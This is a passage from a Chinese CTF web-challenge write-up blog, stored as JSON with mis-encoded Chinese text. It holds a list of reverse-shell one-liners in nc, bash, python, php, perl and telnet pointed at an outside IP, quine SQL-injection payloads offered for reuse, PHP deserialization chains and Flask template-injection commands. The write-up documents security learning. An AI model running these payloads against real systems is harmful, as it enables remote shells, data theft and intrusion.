æ‰€ä»¥åªèƒ½é€šè¿‡åå¼¹shellå»å˜ç›¸å¾—åˆ°å›æ˜¾\n\nç„¶åå°†æ–‡ä»¶å‘½åä¸º2.txt è¿™é‡Œä¸èƒ½ç”¨`.yaml`åç¼€è¢«å±è”½äº†\n\næ—¢ç„¶æ˜¯txtåç¼€ä¸ºä»€ä¹ˆä»£ç ä¼šè¢«æ‰§è¡Œå‘¢\n\nè¿™é‡Œå€Ÿç”¨å¤§ä½¬çš„ç†è§£ï¼š\n\nçŒœæµ‹å¯èƒ½æ˜¯ï¼šè¿™é‡Œfull_loadè°ƒç”¨äº†loadå‡½æ•°ï¼Œè€Œloadå‡½æ•°è¾“å…¥çš„æ˜¯ä¸€ä¸ªsteam,ä¹Ÿå°±æ˜¯æµï¼ŒäºŒè¿›\nåˆ¶æ–‡ä»¶ï¼Œæ‰€ä»¥ä¸ç®¡æ˜¯ä»€ä¹ˆåç¼€éƒ½æ— å…³ç´§è¦äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682518211036-422e9054-fb3e-4dd9-83ca-b93c288dc87a.png)\n\nä¸Šä¼ ä¸Šå»\n\nç„¶åå»`/boogipop`è·¯ç”±ä¸‹å»è¯»å–ï¼Œç„¶ååå¼¹shell\n\nè¿™é‡Œæ–‡ä»¶è·¯å¾„æ˜¯`uplaods/2.txt`\n\nå¤§ä½¬æ–‡ç« ä¹Ÿæåˆ°äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517504048-653cd836-870e-46e6-93e7-ab8e3953106f.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517014776-8237fe1d-8919-406f-9912-cfc0abb2a08b.png)\n\nä¸è¦åœ¨æ„è¿™é‡Œä¸ºä»€ä¹ˆbpæŠ¥é”™ ncèƒ½è¿é€šå°±è¡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517082099-b27ae5c2-2d34-4496-8e96-9155ecfc2a77.png)\n\nåå¼¹shellæˆåŠŸ\n\nå†æ¥è¯´è¯´åå¼¹shell\n\nè¿™é‡Œå°±è¯´è¯´æˆ‘çš„ç†è§£ï¼Œä¸ä¼šå»å°†æ‰€æœ‰æ¦‚å¿µä¸€å­—ä¸æ¼çš„æ‰“å‡ºæ¥ï¼Œæˆ‘è§‰å¾—æ²¡å¿…è¦ï¼Œç†è§£æ˜¯æœ€æ£’çš„ï¼Œæƒ³çœ‹æ¦‚å¿µéšæ—¶éƒ½å¯ä»¥ç™¾åº¦ï¼Œä½†æ˜¯å”¯ç‹¬ç†è§£æ˜¯æ£€æµ‹è‡ªå·±æ˜¯å¦å¯¹äºä¸€ä¸ªçŸ¥è¯†ç‚¹çœŸçš„ç†è§£äº†\n\næˆ‘ä»¬ä¸€èˆ¬ä¸»åŠ¨æ”»å‡»å»è¿æ¥æŸä¸ªç”µè„‘ï¼Œå«åšæ­£å‘è¿æ¥ï¼Œä¸€èˆ¬çŸ¥é“è¿™ä¸ªç”µè„‘ä¸€äº›ä¿¡æ¯ipä¹‹ç±»çš„ï¼ŒçŸ¥é“å®ƒä½•æ—¶åœ¨åšä»€ä¹ˆ\n\nä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¸çŸ¥é“è¿™å°ç”µè„‘ä¿¡æ¯ipä»€ä¹ˆçš„ï¼Œæˆ–è€…æ­¤æ—¶æ­¤åˆ»çš„çŠ¶æ€ï¼Œå°±å«è–›å®šè°”çŠ¶æ€å§ï¼ˆbushiï¼Œå°±æ²¡æ³•å»è¿æ¥å»æ”»å‡» é‚£ä¹ˆåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ\n\nè¿™é‡Œå°±ç”¨åˆ°äº†åå¼¹shell ä½•ä¸ºåå¼¹ï¼Ÿ\n\næ—¢ç„¶æˆ‘ä»¬ä¸çŸ¥é“å¯¹æ–¹çš„çŠ¶æ€ ä½†æ˜¯æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬çš„çŠ¶æ€ä¿¡æ¯ æˆ‘ä»¬å¯ä»¥æä¾›æˆ‘ä»¬è‡ªå·±çš„ä¸€äº›ä¿¡æ¯å»è®©å¯¹æ–¹æ‰¾åˆ°æˆ‘ä»¬ç„¶åè¿æ¥ä¸å°±è¡Œäº†ï¼Ÿ\n\nè¿™é‡Œå¯ä»¥è¿™ä¹ˆå½¢è±¡çš„æ¯”å–»ï¼š\n\nç®€å•çš„è¯´ï¼Œå°±æ˜¯æˆ‘é€äº†å°æ˜ä¸€ä»½ç¤¼ç‰©ï¼Œå°æ˜æ”¶åˆ°äº†ï¼Œçœ‹è§ç¤¼ç‰©é‡Œé¢å†™ç€xxxå¤§è¡—xxxæˆ·xxxå·é¢†å–(æœ¨é©¬)ï¼Œå°æ˜å»äº†æ•²é—¨(æ‰“å¼€æœ¨é©¬ï¼Œåå¼¹shell)ï¼Œæˆ‘å¼€é—¨æŠŠä»–æ‹‰è¿›æ¥(netcat)ï¼Œè¿™æ ·æˆ‘å°±æœ‰äº†ä»–çš„æ”¯é…æƒï¼Œä»–çš„æ“ä½œå°±è¢«æˆ‘æ§åˆ¶äº†ã€‚\n\næ¥è‡ªä¸€ä¸ªbç«™ç½‘å‹ æˆ‘è§‰å¾—å¾ˆå½¢è±¡èƒ½ç†è§£åå¼¹shellçš„æ¦‚å¿µ\n\næ—¢ç„¶æ˜¯å¯¹æ–¹æ‰¾åˆ°æˆ‘ä»¬ï¼Œå°±éœ€è¦ç”¨å…¬ç½‘ipï¼Œæˆ‘ä»¬ç‰©ç†æœºçš„ipéƒ½æ˜¯ä¸€ä¸ªå±€åŸŸç½‘åˆ†é…çš„ï¼ŒçœŸå®ipéƒ½æŒæ¡åœ¨è¿è¥å•†æ‰‹é‡Œ\n\nè¿™é‡Œå°±éœ€è¦ç”¨åˆ°vpsæˆ–è€…åœ¨å¤§å‚ä¹°äº‘æœåŠ¡å³å¯ï¼Œå½“ç„¶ä¹Ÿä¸å½±å“æˆ‘ç™½å«–å®¤å‹çš„äº‘æœåŠ¡å™¨:)\n\nä»¥ä¸Šåªæ˜¯æˆ‘æµ…è–„çš„ç†è§£ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« æ·±å…¥ç†è§£ï¼šhttps://xz.aliyun.com/t/9488\n\nç„¶åæˆ‘ç®€å•æ€»ç»“äº†ä¸€ä¸‹ä¸€äº›å¸¸ç”¨çš„åå¼¹shellçš„expï¼š\n\n```cmake\n1.nc\nnetcat 124.221.177.174 7777 -e /bin/bash\n2.bash\nbash -i >& /dev/tcp/124.221.177.174/7777 0>&1\n3.Telnet:\nmknod a p; telnet 124.221.177.174 7777 0<a | /bin/bash 1>a\n4.python:\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"124.221.177.174\",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n5.php\nphp -r '$sock=fsockopen(\"124.221.177.174\",7777);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n6.perl:\nperl -e 'use Socket;$i=\"124.221.177.174\";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n7.sh\nnc 124.221.177.174 7777 -e /bin/sh\n```\n\nå›åˆ°é¢˜ç›®ï¼Œå‘ç°æ²¡æœ‰å…³äºflagçš„æ–‡ä»¶ï¼Œæ‰€ä»¥è¿˜æ˜¯é€šè¿‡è¯»å–ç¯å¢ƒå˜é‡æ¥è¯»flagï¼Œç»“æŸã€‚\n\n## LoginMaster\n\nè¿™é“é¢˜ æˆ‘çš„è¯„ä»·æ˜¯å¯„ï¼Œåˆ·é¢˜æ²¡åˆ·åˆ°è¿‡è¿™æ ·çš„æ³¨å…¥â€”â€”quineæ³¨å…¥ï¼Œè¿˜æœ‰æ—¶é—´ç›²æ³¨ä¹Ÿè¿˜æ²¡æœ‰å¼€å§‹å­¦å€ŸåŠ©æ­¤æ¬¡æœºä¼šå­¦ä¹ å­¦ä¹ \n\né¦–å…ˆæ—¥å¸¸å…ˆçœ‹`/robots.txt`å‘ç°äº†waf\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682570503152-ae120381-50eb-43c4-9634-a47cff72b0f9.png)\n\nçœ‹åˆ°wafåæˆ‘å°±é™·å…¥äº†æ²‰æ€ï¼Œæˆ‘èƒ½æƒ³åˆ°çš„payloadæ‰€åŒ…å«çš„å‡ ä¹éƒ½æ²³èŸ¹äº†ä¸ªéï¼Œè¿™è¿˜æ€ä¹ˆç©ï¼Œå°±æ”¾å¼ƒäº†\n\nçœ‹äº†wpè¦ç”¨æ—¶é—´ç›²æ³¨å’Œquineç»„åˆæ‹³å»æ‰“\n\nå…¶å®çœ‹äº†waf è¿™æ®µä»£ç ä¹Ÿå¤§æ¦‚èƒ½æ„Ÿè§‰åˆ°æ˜¯quineæ³¨å…¥ \n\nè¿™é‡Œå°±æ˜¯éœ€è¦æˆ‘ä»¬è¾“å…¥çš„å¯†ç ä¸æŸ¥è¯¢åˆ°çš„å¯†ç ç›¸ç­‰ \n\n```cmake\nif ($row['password'] === $password) {\n        die($FLAG);\n```\n\nè¯´ç®€å•ä¸€ç‚¹ï¼Œquineæ³¨å…¥å°±æ˜¯è¾“å…¥ä¸è¾“å‡ºå®Œå…¨ç›¸åŒ è‡ªäº§ç”Ÿç¨‹åºä¹Ÿå°±æ˜¯è¯´å°±æ˜¯è¾“å…¥çš„sqlè¯­å¥ä¸è¦è¾“å‡ºçš„ä¸€è‡´  \n\nç”¨åˆ°replace()å‡½æ•°\n\nå¦‚æœè¾“å…¥ `replace(\".\",char(46),\".\") ` \n\nåˆ™ä¼šè¾“å‡º `.`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682596804773-43900a23-f1bb-4f21-bd92-1258a4af3700.png)\n\nå¦‚æœè¾“å…¥  `replace('replace(\".\",char(46),\".\")',char(46),'replace(\".\",char(46),\".\")') ` \n\nåˆ™ä¼šç”¨ç¬¬ä¸‰ä¸ªå‚æ•°å»æ›¿æ¢ç¬¬ä¸€ä¸ªå‚æ•°ä¸­çš„æ‰€æœ‰`.`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682596879463-3e74e07c-7f75-48f1-92e4-69d21e9d6a21.png)\n\nä½†æ˜¯æ­¤æ—¶å°±ä¼šå‘ç°ä¸€ä¸ªé—®é¢˜ æˆ‘ä»¬è¾“å…¥ä¸è¾“å‡ºå¹¶ä¸æ˜¯å®Œå…¨ç›¸åŒçš„\n\næˆ‘ä»¬è¾“å…¥çš„å•å¼•å·åœ¨è¾“å‡ºè¯­å¥é‡Œéƒ½æ˜¯åŒå¼•å·\n\nå› æ­¤ éœ€è¦åœ¨repalceé‡Œé¢å†åµŒå¥—ä¸€ä¸ªreplaceæ¥è®©åŒå¼•å·è½¬æˆå•å¼•å·  \n\n```\nreplace(replace(\".\",char(34),char(39)),char(46),\".\")\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682597458239-a1bc5eba-19bd-4464-afe0-f5582b6f9c02.png)\n\nç”¨ä¸Šé¢çš„å¼å­æ›¿æ¢æ‰€æœ‰çš„`.`\n\n```\nreplace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")')\n```\n\nå°±ä¼šå‘ç°è¾“å…¥ä¸è¾“å‡ºå®Œå…¨ç›¸ç­‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682597557792-2a8afbc9-a8a2-4de8-a340-a3415d2e2d08.png)\n\n å›åˆ°é¢˜ç›® å› ä¸ºå±è”½äº†ç©ºæ ¼ç”¨`()`åµŒå¥—æˆ–è€…`/**/`ç»•è¿‡éƒ½è¡Œ\n\npayload:`1'UNION(SELECT(REPLACE(REPLACE('1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#',CHAR(34),CHAR(39)),CHAR(37),'1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#')))#`\n\nåˆ†æï¼š\n\n`1'UNION(SELECT(REPLACE(A,CHAR(37),B)))`  ç”¨Bæ›¿æ¢%,%è¿™ä¸ªç¬¦å·åº”è¯¥æ˜¯ä»»æ„çš„åç»­æ›¿æ¢æ—¶å˜æˆç›¸åº”çš„charå°±è¡Œ\n\n`A:REPLACE('1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#',CHAR(34),CHAR(39))`  åŒå¼•å·æ¢ä¸ºå•å¼•å·->æ›¿æ¢%->åŒå¼•å·æ¢ä¸ºå•å¼•å·\n\n```\nB:'1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#'\n```\n\nåŒå¼•å·æ¢ä½å•å¼•å·->æ›¿æ¢%\n\næä¾›ä¸‰ç§payloadå§ï¼Œä»¥åå¦‚æœå†é‡åˆ°è¿™æ ·çš„é¢˜ç›®ä¹Ÿèƒ½æ‹¿æ¥ç›´æ¥ç”¨\n\n1. `1'/**/union/**/select/**/replace(replace('1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#',char(34),char(39)),char(46),'1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#')#`\n2. `1'union/**/select/**/replace(replace('1\"union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#',char(34),char(39)),char(46),'1\"union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#')#`\n3. `1'UNION(SELECT(REPLACE(REPLACE('1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#',CHAR(34),CHAR(39)),CHAR(37),'1\"UNION(SELECT(REPLACE(REPLACE(\"%\",CHAR(34),CHAR(39)),CHAR(37),\"%\")))#')))#`\n\nç¬¬ä¸€ä¸ªpayloadä¸ç¬¬äºŒä¸ªpayloadä¹‹é—´çš„å·®è·ï¼šä¸ºç¬¬ä¸€ä¸ªä¸unionä¹‹é—´æœ‰ç©ºæ ¼ï¼Œç¬¬äºŒä¸ªæ— ï¼Œæœ¬è´¨ä¸Šä¸¤ä¸ªpayloadæ— åŒºåˆ«\n\næ³¨æ„sqlä¸­ä¸ºchar()è€Œä¸æ˜¯chr() ç½‘ä¸Špayloadéœ€è¦è½¬æ¢\n\næå®šï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682598202760-5e0a4fac-7660-4486-bee9-9ef75f6b6530.png)\n\nè‡³äºæ—¶é—´ç›²æ³¨è¿™ä¸ªå‘ï¼Œä»¥åé‡åˆ°ç»å…¸é¢˜å‹å€ŸåŠ©é¢˜ç›®æ¥æ€»ç»“å§ï¼Œè¿™é‡Œæ’ä¸ªçœ¼å…ˆ:)\n\nè¿˜æœ‰ä¸¤é“javaé¢˜ç›®å°±ä¸å¤ç°äº†ï¼Œjavaè¿˜æ˜¯æˆ‘æ²¡æœ‰è§£é”çš„é¢†åŸŸï¼Œå¤ç°èµ·æ¥ä¹Ÿå¾ˆåƒåŠ›ï¼Œä¹‹åç³»ç»Ÿå¼€å§‹å­¦javaä¹‹åå†æ¥å¤ç°å¡«å‘å§ã€‚\n\n# å°å°¾å·´\n\nè¿™æ¬¡æ‰“å®Œçœèµ›ï¼ˆæ ¡èµ›bushiï¼‰è™½ç„¶å¾ˆæ°´ï¼Œä½†æ˜¯æˆåŠŸçˆ¬è¿›äº†å­¦æ ¡çš„å®éªŒå®¤ï¼Œä¹Ÿç®—æ˜¯ä¸€æ®µæ—¶é—´çš„åŠªåŠ›æ€»ç®—æœ‰äº†æˆæœå§ï¼Œè¿›äº†å®éªŒå®¤æ‰æ˜¯åˆšåˆšå¼€å§‹ï¼Œè‡ªèº«è¿˜æ˜¯æœ‰å¾ˆå¤šä¸è¶³ï¼Œéœ€è¦ç»§ç»­åŠªåŠ›ï¼Œç»§ç»­å¥‹æ–—ï¼Œå¹²å·´å¾—ï¼\n","tags":["Smartyæ¨¡æ¿æ³¨å…¥","js","Yamlååºåˆ—åŒ–","shellåå¼¹","quineæ³¨å…¥","python3è§£æç‰¹æ€§"],"categories":["å„èµ›äº‹WP"]},{"title":"CTF-SHOW 2023æ„šäººæ¯ WEBéƒ¨åˆ†WP","url":"/post/186d5605.html","content":"\nCTF-SHOW 2023æ„šäººæ¯ WEBéƒ¨åˆ†WP\n\n<!--more-->\n\n# Challenge_1 easy_signin\n\nè¿™é“é¢˜åƒæ˜¯buuctfä¸€ä¸ªé¢˜ç›®çš„å¥—çš®ï¼ŒæŸ¥çœ‹æºç å’Œurlï¼Œå›¾ç‰‡å†…å®¹æ˜¯ä»¥base64ç¼–ç è¾“å‡ºçš„ï¼Œå¹¶ä¸”è¯·æ±‚æ–‡ä»¶åç§°ä¹Ÿæ˜¯é€šè¿‡base64ç¼–ç ï¼Œç›´æ¥æŸ¥çœ‹index.phpçš„å†…å®¹ï¼Œå…ˆç¼–ç ä¸€ä¸‹index.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680677699456-4fddbbeb-4ad5-4059-9bd5-e8707545697e.png)\n\npayloadï¼š`?img=aW5kZXgucGhw`\n\næ‹¿åˆ°base64åŠ å¯†åçš„å†…å®¹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680677766484-107ac894-6af0-47d9-babb-dbc944ecdae2.png)\n\nå†å»è§£å¯†ä¸€ä¸‹ï¼Œæ‹¿åˆ°flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680677805971-9deab45d-79af-4408-9836-64167015721e.png)\n\n# Challenge_2 è¢«é—å¿˜çš„ååºåˆ—åŒ–\n\n\n\nè¿™é“é¢˜ç›®æ²¡åšå‡ºæ¥ï¼Œä¸€å¼€å§‹å°±å¡ä½äº†ï¼Œä»–æç¤ºå½“å‰ç›®å½•æœ‰ä¸ªtxtæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±åº”è¯¥å…ˆå»è¯»è¿™ä¸ªæ–‡ä»¶è·å–ç›¸åº”çš„æç¤ºï¼Œä¸ä¼šå•Šï¼Œçœ‹äº†wpï¼Œå‘ç°ç”¨äº†phpåŸç”Ÿç±»è¯»çš„ï¼ŒçœŸçš„å¤ªå¼ºäº†\n\nç„¶åè¿™é“é¢˜é¢„æœŸè§£çœŸçš„å¤ªéº»çƒ¦äº†ï¼Œè¿˜è¦æ¶‰åŠå¯†ç åç§»é—®é¢˜ï¼Œè€Œä¸”è¿˜è¦è„šæœ¬çˆ†ç ´ï¼Œéé¢„æœŸçœŸçš„å¾ˆç®€å•\n\n```php\n<?php\n\n# å½“å‰ç›®å½•ä¸­æœ‰ä¸€ä¸ªtxtæ–‡ä»¶å“¦\nerror_reporting(0);\nshow_source(__FILE__);\ninclude(\"check.php\");\n\nclass EeE{\n    public $text;\n    public $eeee;\n    public function __wakeup(){\n        if ($this->text == \"aaaa\"){\n            echo lcfirst($this->text);\n        }\n    }\n\n    public function __get($kk){\n        echo \"$kk,eeeeeeeeeeeee\";\n    }\n\n    public function __clone(){\n        $a = new cycycycy;\n        $a -> aaa();\n    }\n    \n}\n\nclass cycycycy{\n    public $a;\n    private $b;\n\n    public function aaa(){\n        $get = $_GET['get'];\n        $get = cipher($get);\n        if($get === \"p8vfuv8g8v8py\"){\n            eval($_POST[\"eval\"]);\n        }\n    }\n\n\n    public function __invoke(){\n        $a_a = $this -> a;\n        echo \"\\$a_a\\$\";\n    }\n}\n\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __toString(){\n        if(isset($this->name)){\n            $a = new $this->coos($this->file);\n            echo $a;\n        }else if(!isset($this -> file)){\n            return $this->coos->name;\n        }else{\n            $aa = $this->coos;\n            $bb = $this->file;\n            return $aa();\n        }\n    }\n}   \n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n    public function __wakeup(){\n        if(!preg_match(\"/php|63|\\*|\\?/i\",$this -> key)){\n            $this->key = file_get_contents($this -> file);\n        }else{\n            echo \"ä¸è¡Œå“¦\";\n        }\n    }\n\n    public function __destruct(){\n        echo $this->aaa;\n    }\n\n    public function __invoke(){\n        $this -> aaa = clone new EeE;\n    }\n}\n\n$_ip = $_SERVER[\"HTTP_AAAAAA\"];\nunserialize($_ip);\n```\n\nç›´æ¥æ¥çœ‹è¿™é‡Œï¼š\n\n```php\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __toString(){\n        if(isset($this->name)){\n            $a = new $this->coos($this->file);\n            echo $a;\n        }else if(!isset($this -> file)){\n            return $this->coos->name;\n        }else{\n            $aa = $this->coos;\n            $bb = $this->file;\n            return $aa();\n        }\n    }\n}   \n```\n\n`$a = new $this->coos($this->file);` è¿™ä¸€è¡Œ çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥æ„é€ ä¸€ä¸ªå¯å˜å‡½æ•° å½¢å¦‚ï¼š$a($b)çš„å½¢å¼è¾¾åˆ°getshellçš„æ“ä½œ ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªnew å°†ç±»å®ä¾‹åŒ– ä¹Ÿå°±æ„ä¸ºç€ä¸èƒ½é€šè¿‡è¿™æ ·æ¥æ„é€ å¯å˜å‡½æ•°\n\né‚£ä¹ˆè¿™é‡Œå°±ç”¨åˆ°äº†phpçš„åŸç”Ÿç±»ï¼Œå…·ä½“çœ‹è¿™ç¯‡æ–‡ç« ï¼šhttps://blog.csdn.net/cjdgg/article/details/115314651\n\nå¯éå†ç›®å½•çš„åŸç”Ÿç±»ï¼š\n\nDirectoryIterator ç±»\nFilesystemIterator ç±»\n\nGlobIterator ç±»  \n\nä½¿ç”¨ DirectoryIterator ç±»\nDirectoryIteratoré…åˆglob://åè®®ç»“åˆå°†æ— è§†open_basedirå¯¹ç›®å½•çš„é™åˆ¶ï¼Œå¯ä»¥ç”¨æ¥åˆ—ä¸¾å‡ºæŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ \n\næ¯”å¦‚ä»¥è¿™æ ·çš„`/f*`å½¢å¼æ¨¡ç³Šæ“ä½œæ¥è·å¾—flagçš„æ–‡ä»¶å\n\næ¯”å¦‚æˆ‘winç”µè„‘ä¸Šdç›˜æ ¹ç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ªblogæ–‡ä»¶,æˆ‘å°±å¯ä»¥åˆ©ç”¨åŸç”Ÿç±»å†é…åˆglobåè®®è·å–åˆ°è¯¥æ–‡ä»¶çš„å…·ä½“æ–‡ä»¶å\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680679507460-93022bf0-b786-497a-ae92-c77e7bcaad71.png)\n\nå›åˆ°é¢˜ç›®ï¼šæœ¬åœ°æ„é€ \n\n```php\n<?php\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n}   \n\n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n}\n\n\n$w=new w_wuw_w();\n$w->aaa=new gBoBg(); //é€šè¿‡ç±»W_WUW_Wä¸­çš„ææ„å‡½æ•°æ¥è°ƒç”¨ç±»gBoBgä¸­çš„__toStringé­”æœ¯æ–¹æ³•\n$w->aaa->name=\"1\";\n$w->aaa->file=\"glob:///f*\";\n$w->aaa->coos=\"DirectoryIterator\";\necho urlencode(serialize($w));\n?>\n```\n\nç„¶åè¿™é‡Œä¼ å‚æ˜¯é€šè¿‡è¯·æ±‚åŒ…ä¸­AAAAAAæ¥ä¼ å‚çš„è›®æ–°é¢–çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680020351-96a2b7d8-9c2b-4bae-a866-bdb03409e953.png)\n\nç„¶åå†é€šè¿‡è¯»æ–‡ä»¶åŸç”Ÿç±»æ¥è¯»flag\n\nSplFileObject\n\næœ¬åœ°æ„é€ ï¼š\n\n```php\n<?php\nclass gBoBg{\n    public $name;\n    public $file;\n    public $coos;\n}   \n\n\nclass w_wuw_w{\n    public $aaa;\n    public $key;\n    public $file;\n}\n\n\n$w=new w_wuw_w();\n$w->aaa=new gBoBg(); //é€šè¿‡ç±»W_WUW_Wä¸­çš„ææ„å‡½æ•°æ¥è°ƒç”¨ç±»gBoBgä¸­çš„__toStringé­”æœ¯æ–¹æ³•\n$w->aaa->name=\"1\";\n$w->aaa->file=\"/f1agaaa\";\n$w->aaa->coos=\"SplFileObject\";\necho serialize($w);\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680133216-6324145c-b089-45c1-b238-7e7d2e81a43b.png)\n\n# Challenge_3 easy_ssti\n\nè¿™é“é¢˜è¿˜æ˜¯è›®ç®€å•çš„ æ ¹æ®é¢˜ç›®æ˜¯ä¸€ä¸ªæ¨¡æ¿æ³¨å…¥çš„é¢˜ç›®\n\næŸ¥çœ‹æºç  ä¸‹è½½ä¸€ä¸ªå‹ç¼©åŒ…\n\n```php\nfrom flask import Flask\nfrom flask import render_template_string,render_template\napp = Flask(__name__)\n\n@app.route('/hello/')\ndef hello(name=None):\n    return render_template('hello.html',name=name)\n@app.route('/hello/<name>')\ndef hellodear(name):\n    if \"ge\" in name:\n        return render_template_string('hello %s' % name)\n    elif \"f\" not in name:\n        return render_template_string('hello %s' % name)\n    else:\n        return 'Nonononon'\n```\n\nä¸€çœ¼é¡¶é’ˆï¼Œflaskçš„æ¨¡æ¿æ³¨å…¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680541981-d158f0ea-eb91-455f-96f7-e07327426721.png)\n\nç„¶åç½‘ä¸Špayoadå¤ªå¤šäº†ï¼ˆhttps://blog.csdn.net/qq_46918279/article/details/121270806ï¼‰\n\nè¿™é‡Œä¸»è¦è¿‡æ»¤äº†æ–œæ ï¼Œå¯ä»¥ç”¨`${HOME:0:1}`ç»•è¿‡\n\npayload: \n\n`{{get_flashed_messages.__globals__['os'].popen('whoami').read()}}`\n\n`{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat ${HOME:0:1}[e-g]lag').read()}}` \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680569196-d457fb09-796e-4298-a9cc-6d686b500d42.png)\n\n# challenge_4 easy_flask\n\nè¿™é“é¢˜ç›®å¿«åšå‡ºæ¥äº†ï¼Œæœ€åä¸€æ­¥æ²¡æœ‰å»è¯»å–å½“å‰ç›®å½•ä¸‹çš„app.pyçš„æ–‡ä»¶å»çœ‹æºç ï¼ŒçœŸç»™è‡ªå·±æ— è¯­ä½äº†ï¼Œè„‘å­è¢«å¤§ä¾¿çŒäº†ä¸€æ ·\n\nå›åˆ°é¢˜ç›®ï¼š\n\nçœ‹æ ‡é¢˜è¿˜æ˜¯å…³äºflaskæ¨¡æ¿çš„æ¼æ´\n\nç”³è¯·ä¸€ä¸ªè´¦å·è¿›å»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681197676-57ac85a1-3064-41a1-83d0-732cb4a05b0d.png)\n\næœ€åä¸€å¥è¯ä»–è¯´åªä¼šç»™adminç»™ä¸€äº›ä¸œè¥¿ï¼Œé‚£ä¹ˆç›®æ ‡å°±å¾ˆæ˜ç¡®äº†ï¼Œflaskæ¨¡æ¿å¸¸è§çš„sessionä¼ªé€ ï¼Œæ‰¾ä¸€ä¸ªè„šæœ¬ä¼ªé€ å°±è¡Œäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681282376-730ae4d5-a1ae-4d8f-a582-40b6713c5101.png)\n\nä¹‹åç»™åˆ°ä¸€ä¸ªå‡çš„flag ç„¶åæ³¨æ„åˆ°ä»–è¯·æ±‚æ–¹å¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681334740-bdbc1132-befd-4deb-b14f-7f1c618c8af1.png)\n\nä»–ç°åœ¨ç»™çš„æºä»£ç åªæ˜¯ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬åº”è¯¥é€šè¿‡è¯»app.pyæ¥è·å–å®Œæ•´çš„æºä»£ç \n\n```php\n# app.py\nfrom flask import Flask, render_template, request, redirect, url_for, session, send_file, Response\n\n\napp = Flask(__name__)\n\n\napp.secret_key = 'S3cr3tK3y'\n\nusers = {\n    'admin': {'password': 'LKHSADSFHLA;KHLK;FSDHLK;ASFD', 'role': 'admin'}\n}\n\n\n\n@app.route('/')\ndef index():\n    # Check if user is loggedin\n    if 'loggedin' in session:\n        return redirect(url_for('profile'))\n    return redirect(url_for('login'))\n\n@app.route('/login/', methods=['GET', 'POST'])\ndef login():\n    msg = ''\n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users and password == users[username]['password']:\n            session['loggedin'] = True\n            session['username'] = username\n            session['role'] = 